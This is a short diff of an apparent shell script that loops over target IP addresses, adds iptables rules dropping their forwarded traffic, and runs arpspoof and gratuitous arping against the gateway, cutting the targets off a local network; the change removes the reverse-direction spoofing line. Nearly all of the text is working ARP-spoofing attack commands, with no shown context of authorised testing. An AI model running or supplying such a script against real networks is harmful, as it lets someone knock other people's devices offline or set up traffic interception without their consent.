@@ -130,7 +130,6 @@ for TARGET_IP in "${TARGET_IPS[@]}"; do
     iptables -A FORWARD -s "$TARGET_IP" -j DROP
     iptables -A FORWARD -d "$TARGET_IP" -j DROP
     arpspoof -i "$INTERFACE" -t "$TARGET_IP" -r "$GATEWAY" >/dev/null 2>&1 &
-    arpspoof -i "$INTERFACE" -t "$GATEWAY" -r "$TARGET_IP" >/dev/null 2>&1 &
     arping -b -A -i "$INTERFACE" -S "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 &
 done
 
